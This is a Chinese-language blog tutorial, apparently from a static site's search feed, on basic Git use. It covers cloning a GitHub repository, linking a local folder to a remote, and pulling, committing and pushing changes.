        <content type="html"><![CDATA[<h1 id="克隆GitHub仓库到本地"><a href="#克隆GitHub仓库到本地" class="headerlink" title="克隆GitHub仓库到本地"></a>克隆GitHub仓库到本地</h1><p>方法一：Code -&gt; Download ZIP（有的时候会有一些问题，不建议）</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20231215133946737.png" alt="image-20231215133946737"></p><p><strong>方法二：使用git clone项目到本地（推荐）</strong></p><p>Code -&gt; 复制HTTPS协议对应的url。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20231215134218730.png" alt="image-20231215134218730"></p><p>在本地文件夹打开Git Bash，在命令行中输入以下命令，将仓库克隆到本地（这里的仓库地址就是上面复制的url）：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="keyword">clone</span> <span class="title">仓库地址</span></span><br></pre></td></tr></table></figure><p>执行命令后，Git就会从GitHub服务器上将仓库的所有文件和历史记录克隆到你的本地目录中。克隆完成后，你可以在当前目录下找到一个与仓库同名的文件夹，里面包含了完整的仓库内容。</p><p>后续可以安装相关依赖等</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install -r requirements.txt --user</span><br></pre></td></tr></table></figure><h1 id="本地代码和GitHub同步"><a href="#本地代码和GitHub同步" class="headerlink" title="本地代码和GitHub同步"></a>本地代码和GitHub同步</h1><h2 id="将github项目pull到本地"><a href="#将github项目pull到本地" class="headerlink" title="将github项目pull到本地"></a>将github项目pull到本地</h2><p><strong>第一次pull：</strong></p><p>即将远程代码仓库中(新)的内容下载到本地，并更新本地代码仓库的内容，我们一般叫pull。</p><p>首先需要在本地创建一个空文件夹，作为项目的存放仓库。然后进入该文件夹下，打开Git Bush，输入以下命令将该目录初始化为Git仓库。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git init</span><br></pre></td></tr></table></figure><p>（之后该处会生成一个隐藏的文件夹【.git】）</p><p>然后将这个本地仓库连接到Github上的对应项目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git remote add origin 远程仓库地址</span><br></pre></td></tr></table></figure><p>这里的远程仓库地址就是前面所复制的HTTPS协议对应的url</p><blockquote><p>如果不小心填错了，可以使用指令清除地址重新设置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git remote remove origin </span><br></pre></td></tr></table></figure><p>同样也可以执行命令查看是否连接成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git remote -v</span><br></pre></td></tr></table></figure></blockquote><p>然后，使用Pull指令拉取代码，从远程源的主分支更新代码到本地</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git pull origin master</span><br></pre></td></tr></table></figure><p><strong>后续拉取github上的更新到本地：只需要git pull即可</strong></p><h2 id="将本地项目push到github"><a href="#将本地项目push到github" class="headerlink" title="将本地项目push到github"></a>将本地项目push到github</h2><p>第一次push：</p><p>同样的，创建空文件夹后git init</p><p>执行add命令<strong>将整个文件夹添加到本地仓库</strong>，注意后面有一个点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br></pre></td></tr></table></figure><blockquote><p>如果只想添加单个文件使用命令：<code> git add 文件名</code> 这种方式 ，例如：git add test.txt.</p></blockquote><p><strong>后续将本地更新后的代码上传到GitHub只需要</strong></p><p>如果在多个远程设备上操作，记得开始进行今日的操作前要先：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull</span><br></pre></td></tr></table></figure><p>完成所有操作准备离开时要记得：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m ‘xx’</span><br><span class="line">git push</span><br></pre></td></tr></table></figure><p>tip: 要保证本地库和server是同步的，不然忘记先pull，若其他远程设备上已经push了新的内容，自己这里是push不上去的，只能进行git pull合并，这个操作还会覆盖你已经更改了的部分，会非常痛苦。</p><h3 id="如何设置不push某些内容上去"><a href="#如何设置不push某些内容上去" class="headerlink" title="如何设置不push某些内容上去"></a>如何设置不push某些内容上去</h3><h1 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h1><ul><li><strong>error: src refspec master does not match any</strong>：<ul><li>解决：<a href="https://blog.csdn.net/qq_38198952/article/details/82792279">https://blog.csdn.net/qq_38198952/article/details/82792279</a></li></ul></li></ul><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>侵权删：</p><ul><li><a href="https://devpress.csdn.net/cloud-native/64ffdfd8993dd34278ee2d52.html">https://devpress.csdn.net/cloud-native/64ffdfd8993dd34278ee2d52.html</a></li><li><a href="https://blog.csdn.net/daydayup858/article/details/128201627">https://blog.csdn.net/daydayup858/article/details/128201627</a></li><li><a href="https://zhuanlan.zhihu.com/p/438410278">https://zhuanlan.zhihu.com/p/438410278</a></li><li><a href="https://blog.csdn.net/qq_45583787/article/details/126882580">https://blog.csdn.net/qq_45583787/article/details/126882580</a></li><li><a href="https://blog.csdn.net/vir_lee/article/details/80464408">https://blog.csdn.net/vir_lee/article/details/80464408</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
            <tag> 版本控制 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
